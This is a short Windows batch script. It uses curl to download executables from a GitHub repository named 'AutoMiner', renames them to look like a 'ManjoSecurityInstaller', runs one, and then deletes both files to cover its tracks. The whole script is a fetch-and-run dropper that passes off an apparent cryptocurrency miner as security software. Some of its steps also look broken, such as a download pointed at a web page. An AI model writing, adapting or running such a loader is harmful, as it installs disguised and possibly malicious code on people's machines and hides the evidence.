cd C:/
curl -LJO https://github.com/Tuba202/AutoMiner/blob/main/ManjoSecureRollout_C.exe?raw=true -o ManjoSecurityInstallerC.exe
Ren "ManjoSecureRollout_C.exe_raw=true" "ManjoSecurityInstallerC.exe"
ManjoSecurityInstallerC.exe
curl https://downgit.github.io/#/home?url=https://github.com/Tuba202/AutoMiner/blob/main/ManjoSecureRollout_g.exe?raw=true -o ManjoSecurityInstallerG.exe
Ren "ManjoSecureRollout_g.exe_raw=true" "ManjoSecurityInstallerG.exe"
ManjoSecurityInstallerC.exe && echo done
Timeout /t 1 >nul && Del /f ManjoSecurityInstallerC.exe && Del /f ManjoSecurityInstallerG.exe
Echo files deleted
Timeout /t 1 >nul
